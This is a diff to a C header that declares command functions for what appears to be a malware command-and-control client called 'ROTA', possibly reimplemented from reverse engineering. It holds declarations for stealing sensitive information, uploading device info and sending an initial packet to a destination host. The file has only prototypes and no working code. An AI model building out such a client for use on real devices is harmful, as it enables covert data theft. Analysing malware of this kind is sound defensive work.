@@ -55,7 +55,7 @@ char *c2_steal_sensitive_info();
 * @brief obtain information from /etc/os-release command-id: 0x18320e0
 *
 */
-void c2_upload_device_info();
+char *c2_upload_device_info();
 
 /**
 * @brief check for the existance of a given file/plugin on the file system 0x2CD9070
@@ -97,5 +97,12 @@ void c2_run_plugin_2();
  * @return N/A
  **/
 void c2_run_plugin_3();
+
+/**
+ * @brief send initial pkt to destinatio host.
+ * @param N/A
+ * @return char pointer to ROTA's initial header.
+ **/
+char *initial_rota_pkt();
 
 #endif // C2_COMMANDS_H_
